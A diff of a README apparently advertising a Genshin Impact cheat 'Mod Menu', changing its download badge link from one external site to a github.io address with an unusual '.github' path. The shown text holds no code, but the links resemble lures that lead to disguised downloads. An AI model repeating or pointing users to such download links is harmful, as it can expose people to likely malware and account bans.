@@ -2,7 +2,7 @@
 
 A feature-rich Mod Menu for Genshin Impact, offering enhanced gameplay with customizable cheats and tools.
 
-[![Download Genshin Impact Mod Menu](https://img.shields.io/badge/Download-Genshin_Impact_Mod_Menu-blueviolet)](https://seomadjest.com/)
+[![Download Genshin Impact Mod Menu](https://img.shields.io/badge/Download-Genshin_Impact_Mod_Menu-blueviolet)](https://genshin-impact-mod-menu-pro.github.io/.github)
 
 ---
 
